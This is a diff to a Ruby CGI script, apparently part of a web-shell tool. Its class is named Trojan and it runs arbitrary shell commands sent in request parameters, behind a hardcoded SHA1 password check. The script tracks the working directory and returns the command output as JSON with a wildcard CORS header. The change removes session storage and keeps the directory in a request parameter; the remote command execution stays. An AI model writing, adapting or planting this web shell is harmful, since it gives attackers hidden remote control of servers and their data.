@@ -1,38 +1,35 @@
 #!/usr/bin/env ruby
 require 'cgi'
-require 'cgi/session'
-require 'cgi/session/pstore'
 require 'digest/sha1'
 require 'json'
 
 class Trojan
-    attr_accessor :cgi, :cwd, :response, :session
+    attr_accessor :cgi, :cwd, :response
 
     def initialize params
         @cgi      = params[:cgi]
-        @session  = params[:session]
-        @cwd      = (@session[:cwd].nil?) ? `pwd`.strip! : @session[:cwd]
+        @cwd      = (params['cwd'].nil?) ? `pwd`.strip! : params['cwd']
         @response = {};
     end
 
     def process_command()
         json = @cgi.params
         if json['action'].first.eql? 'shell'
-            process_shell_command(json['cmd'].first)
+            process_shell_command(json['args']['cmd'].first)
         else
             send json['action'].first, json
         end
     end
 
     def process_shell_command command
-        out_lines           = `cd #{@cwd}; #{command} 2>&1; pwd`.split "\n"
-        @cwd                = @session[:cwd] = out_lines.pop
-        @response['output'] = out_lines.join "\n"
+        out_lines                     = `cd #{@cwd}; #{command} 2>&1; pwd`.split "\n"
+        @response['output']['cwd']    = @cwd = out_lines.pop
+        @response['output']['stdout'] = out_lines.join "\n"
         self.send_response
     end
 
     def send_response
-        @response['prompt_context'] = self.get_prompt_context
+        @response['output']['prompt'] = self.get_prompt_context
         puts @cgi.header('Access-Control-Allow-Origin: *')
         puts @response.to_json
         exit
@@ -57,19 +54,8 @@ cgi  = CGI.new
 
 hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + 'c5e5f704ee')
 if hash.eql? '003da5748a1cdeac275548be9741cb35b76f773d'
-    session = CGI::Session.new(
-        cgi,
-        'database_manager' => CGI::Session::PStore,
-        'session_key'      => 'wash',
-        'session_expires'  => Time.now + 30 * 60,
-        'prefix'           => 'wash_pstore_sid_'
-    )
-    trojan = Trojan.new({
-        :cgi     => cgi, 
-        :session => session, 
-    })
+    trojan = Trojan.new({ :cgi => cgi })
     trojan.process_command
-    session.close
 else
     puts cgi.header('Access-Control-Allow-Origin: *')
     puts '{"error":"Invalid password."}'
